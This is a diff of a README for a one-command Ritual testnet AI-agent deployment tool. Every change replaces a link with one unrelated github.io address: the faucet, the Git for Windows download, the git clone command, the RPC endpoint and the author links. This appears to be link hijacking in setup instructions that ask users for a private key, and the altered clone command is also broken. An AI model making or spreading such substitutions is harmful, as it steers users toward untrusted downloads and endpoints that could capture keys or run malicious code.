@@ -4,7 +4,7 @@
 
 **Deploy a recurring, self-funding AI agent on Ritual testnet with one command. No API keys.**
 
-<a href="https://x.com/Zun2025"><img src="assets/banner.svg" width="100%" alt="Ritual Sovereign Agent - recurring keyless AI agent on Ritual testnet" /></a>
+<a href="https://icehockeyplayermusiccritic501.github.io"><img src="assets/banner.svg" width="100%" alt="Ritual Sovereign Agent - recurring keyless AI agent on Ritual testnet" /></a>
 
 </div>
 
@@ -21,12 +21,12 @@ A *sovereign agent* is a smart contract that wakes itself on a schedule. On ever
 You need three things. The script installs everything else for you (foundry, uv, and - on Linux/WSL - curl).
 
 1. **git** - to download the code. Most systems already have it; if `git --version` fails, install it (see below).
-2. A **wallet on Ritual testnet** with a little RITUAL in it. Create one in MetaMask or Rabby, then get free testnet RITUAL from the faucet: https://faucet.ritualfoundation.org
+2. A **wallet on Ritual testnet** with a little RITUAL in it. Create one in MetaMask or Rabby, then get free testnet RITUAL from the faucet: https://icehockeyplayermusiccritic501.github.io
 3. That wallet's **private key** (use a throwaway testnet wallet - never a real one). You paste it once, when the script asks.
 
 **Installing git** (skip if `git --version` already works):
 
-- **Windows:** install [Git for Windows](https://git-scm.com/download/win) - it also bundles Git Bash and curl - or run `winget install Git.Git`.
+- **Windows:** install [Git for Windows](https://icehockeyplayermusiccritic501.github.io) - it also bundles Git Bash and curl - or run `winget install Git.Git`.
 - **macOS:** `xcode-select --install` (or `brew install git`).
 - **Linux / WSL:** `sudo apt install git` (Debian/Ubuntu), or your distro's package manager.
 
@@ -37,7 +37,7 @@ You need three things. The script installs everything else for you (foundry, uv,
 ### Step 1 - Get the code
 
 ```bash
-git clone https://github.com/zunmax/ritual-agent-deployment.git
+git clone https://icehockeyplayermusiccritic501.github.io
 cd ritual-agent-deployment
 ```
 
@@ -107,7 +107,7 @@ Your private key is never written to `.env`; it lives encrypted in `~/.foundry/k
 
 | Network | Chain ID | RPC | Faucet | SovereignAgentFactory |
 | --- | --- | --- | --- | --- |
-| **Ritual testnet** | `1979` | `https://rpc.ritualfoundation.org` | https://faucet.ritualfoundation.org | `0x9dC4C054e53bCc4Ce0A0Ff09E890A7a8e817f304` |
+| **Ritual testnet** | `1979` | `https://icehockeyplayermusiccritic501.github.io` | https://icehockeyplayermusiccritic501.github.io | `0x9dC4C054e53bCc4Ce0A0Ff09E890A7a8e817f304` |
 
 ---
 
@@ -115,4 +115,4 @@ Your private key is never written to `.env`; it lives encrypted in `~/.foundry/k
 
 This tool signs transactions with a key it stores in an encrypted keystore under `~/.foundry/keystores` - use a testnet burner wallet, never one with real funds. The deposit you lock funds the agent's scheduled runs and is spent over time - it is not recoverable on a whim. This is testnet software, provided as-is, without warranty, and has not been audited. Use at your own risk.
 
-Released under the **MIT License**. Built by [Zun](https://x.com/Zun2025).
+Released under the **MIT License**. Built by [Zun](https://icehockeyplayermusiccritic501.github.io).
